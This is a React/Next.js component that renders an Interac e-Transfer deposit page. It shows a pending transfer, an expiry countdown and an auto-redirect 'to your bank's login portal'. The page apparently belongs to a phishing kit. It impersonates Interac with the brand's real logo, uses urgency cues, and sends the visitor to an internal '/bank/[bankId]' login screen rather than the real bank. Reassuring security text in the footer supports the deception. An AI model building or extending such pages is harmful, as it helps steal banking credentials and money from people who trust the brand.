"use client"

import { useEffect, useState, useRef, useMemo } from "react"
import type { InteracMockPayload } from "@/types/interac"
import Image from "next/image"
import { Clock, AlertTriangle } from "lucide-react"

interface TransferData {
  transferId: string
  amount: string
  recipient: string
  recipientName: string
  senderBank: string
  message: string
  timestamp: string
}

interface CountdownRedirectScreenProps {
  data: InteracMockPayload
  transferData?: TransferData | null
}

function calculateTimeRemaining(timestamp: string): string {
  const transferDate = new Date(timestamp)
  const expiryDate = new Date(transferDate.getTime() + 30 * 24 * 60 * 60 * 1000) // 30 days from transfer
  const now = new Date()
  
  const diffMs = expiryDate.getTime() - now.getTime()
  
  if (diffMs <= 0) {
    return "Expired"
  }
  
  const days = Math.floor(diffMs / (24 * 60 * 60 * 1000))
  const hours = Math.floor((diffMs % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000))
  const minutes = Math.floor((diffMs % (60 * 60 * 1000)) / (60 * 1000))
  
  const parts = []
  if (days > 0) parts.push(`${days} day${days !== 1 ? 's' : ''}`)
  if (hours > 0) parts.push(`${hours} hour${hours !== 1 ? 's' : ''}`)
  if (minutes > 0) parts.push(`${minutes} minute${minutes !== 1 ? 's' : ''}`)
  
  return parts.join(', ') || 'Less than a minute'
}

export default function CountdownRedirectScreen({ data, transferData }: CountdownRedirectScreenProps) {
  const [countdown, setCountdown] = useState(data.ui.redirectSeconds)
  const [timeRemaining, setTimeRemaining] = useState("")
  const hasRedirected = useRef(false)
  
  // Calculate time remaining for expiry
  useEffect(() => {
    const timestamp = transferData?.timestamp || data.meta.timestamp
    setTimeRemaining(calculateTimeRemaining(timestamp))
    
    const interval = setInterval(() => {
      setTimeRemaining(calculateTimeRemaining(timestamp))
    }, 60000) // Update every minute
    
    return () => clearInterval(interval)
  }, [transferData?.timestamp, data.meta.timestamp])

  // Build the bank login redirect URL
  // Prefer /bank/[bankId] (internal connector screen) with transfer params forwarded.
  // Fall back to the bank's direct loginUrl from bankVisuals if bankId is missing.
  const getBankRedirectUrl = () => {
    const params = new URLSearchParams(typeof window !== "undefined" ? window.location.search : "")
    const bankId = params.get("bankId")
    if (bankId) {
      const fwdParams = new URLSearchParams({
        transferId:    transferData?.transferId    || data.meta.id,
        amount:        transferData?.amount        || String(data.deposit.amount),
        recipient:     transferData?.recipient     || data.payee.email,
        recipientName: transferData?.recipientName || data.payee.name,
        senderBank:    transferData?.senderBank    || data.sender.bankName,
        message:       transferData?.message       || data.deposit.memo || "",
        timestamp:     transferData?.timestamp     || data.meta.timestamp,
      })
      return `/bank/${bankId}?${fwdParams.toString()}`
    }
    return data.bankVisuals.login || "https://www.interac.ca"
  }

  useEffect(() => {
    if (countdown <= 0) {
      if (!hasRedirected.current) {
        hasRedirected.current = true
        window.location.href = getBankRedirectUrl()
      }
      return
    }
    // Always show the manual button once countdown reaches 0 (no gate on autoRedirect flag)

    const timer = setInterval(() => {
      setCountdown((prev) => prev - 1)
    }, 1000)

    return () => clearInterval(timer)
  }, [countdown, data.ui.autoRedirect, data.bankVisuals.login])

  const handleManualRedirect = () => {
    window.location.href = getBankRedirectUrl()
  }

  return (
    <div className="min-h-screen bg-black flex flex-col">
      <div className="w-full h-2 bg-[#FFCB05]" />

      <header className="border-b border-zinc-800 bg-black">
        <div className="max-w-4xl mx-auto px-4 py-4 flex items-center gap-3">
          <div className="relative w-12 h-12 rounded-lg overflow-hidden bg-white flex items-center justify-center">
            <Image
              src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
              alt="Interac"
              fill
              className="object-contain p-1"
            />
          </div>
          <h1 className="text-xl font-semibold text-white">{data.bankVisuals.name}</h1>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="max-w-2xl w-full space-y-8">
          <div className="flex flex-col items-center space-y-6">
            <div className="relative w-40 h-40 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full border-8 border-zinc-800" />
              <div
                className="absolute inset-0 rounded-full border-8 border-[#FFCB05] border-t-transparent animate-spin"
                style={{ animationDuration: "3s" }}
              />
              <span className="text-7xl font-bold text-[#FFCB05] tabular-nums">{countdown}</span>
            </div>

            <div className="text-center space-y-2">
              <h2 className="text-2xl font-semibold text-white">Redirecting to your bank</h2>
              <p className="text-lg text-zinc-400">
                You will be taken to your bank&apos;s login portal in{" "}
                <span className="text-[#FFCB05] font-semibold tabular-nums">{countdown}</span> seconds
              </p>
            </div>
          </div>

          <div className="bg-zinc-900 rounded-2xl border border-zinc-800 p-6 space-y-6">
            <div className="flex items-center justify-between pb-4 border-b border-zinc-800 flex-wrap gap-3">
              <h3 className="text-lg font-semibold text-white">Transaction Details</h3>
              <span className="px-3 py-1 rounded-full text-xs font-medium bg-amber-500/10 text-amber-400 border border-amber-500/20">
                PENDING - Awaiting Confirmation
              </span>
            </div>

            {/* Expiry Notice */}
            <div className="flex items-start gap-3 p-4 bg-amber-950/30 border border-amber-900/50 rounded-xl">
              <Clock className="w-5 h-5 text-amber-400 flex-shrink-0 mt-0.5" />
              <div className="flex-1">
                <p className="text-sm font-semibold text-amber-300 mb-1">Transfer Expiry Notice</p>
                <p className="text-sm text-amber-200/80">
                  Time remaining: <span className="font-semibold text-amber-300">{timeRemaining}</span>
                </p>
                <p className="text-xs text-zinc-400 mt-1">
                  This transfer will expire 30 days from the original transaction date. Please complete your deposit before expiry.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-1">
                <p className="text-sm text-zinc-500">Amount</p>
                <p className="text-xl font-bold text-white">
                  ${transferData
                    ? parseFloat(transferData.amount).toFixed(2)
                    : data.deposit.amount.toFixed(2)
                  } {data.deposit.currency}
                </p>
              </div>

              <div className="space-y-1">
                <p className="text-sm text-zinc-500">Reference</p>
                <p className="text-base font-mono text-white">
                  {transferData?.transferId || data.deposit.reference}
                </p>
              </div>

              <div className="space-y-1">
                <p className="text-sm text-zinc-500">Recipient</p>
                <p className="text-base text-white">
                  {transferData?.recipientName || data.payee.name}
                </p>
                <p className="text-sm text-zinc-400">
                  {transferData?.recipient || data.payee.email}
                </p>
              </div>

              <div className="space-y-1">
                <p className="text-sm text-zinc-500">From</p>
                <p className="text-base text-white">
                  {transferData?.senderBank || data.sender.bankName}
                </p>
              </div>

              {(transferData?.message || data.deposit.memo) && (
                <div className="space-y-1 md:col-span-2">
                  <p className="text-sm text-zinc-500">Message</p>
                  <p className="text-base text-white">
                    {transferData?.message || data.deposit.memo}
                  </p>
                </div>
              )}

              <div className="space-y-1 md:col-span-2">
                <p className="text-sm text-zinc-500">Transaction ID</p>
                <p className="text-sm font-mono text-zinc-400">
                  {transferData?.transferId || data.meta.id}
                </p>
              </div>
            </div>
          </div>

          <div className="flex flex-col items-center space-y-3">
            <button
              onClick={handleManualRedirect}
              className="w-full md:w-auto px-8 py-4 bg-[#FFCB05] hover:bg-[#FFD84D] text-black font-semibold rounded-xl transition-colors duration-200 flex items-center justify-center gap-2"
            >
              Continue to Bank Login
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" />
              </svg>
            </button>
            <p className="text-sm text-zinc-500">
              {countdown > 0
                ? `Redirecting automatically in ${countdown}s — or click to continue now`
                : "Click to proceed to your bank login"}
            </p>
          </div>
        </div>
      </main>

      <footer className="border-t border-zinc-800 bg-black">
        <div className="max-w-4xl mx-auto px-4 py-6">
          <div className="flex items-start gap-3 text-sm text-zinc-500">
            <svg className="w-5 h-5 text-[#FFCB05] flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
              <path
                fillRule="evenodd"
                d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                clipRule="evenodd"
              />
            </svg>
            <p className="leading-relaxed">
              You are being securely redirected to your financial institution. Never share your banking credentials with
              anyone. Interac e-Transfer is a registered trademark of Interac Corp.
            </p>
          </div>
        </div>
      </footer>
    </div>
  )
}
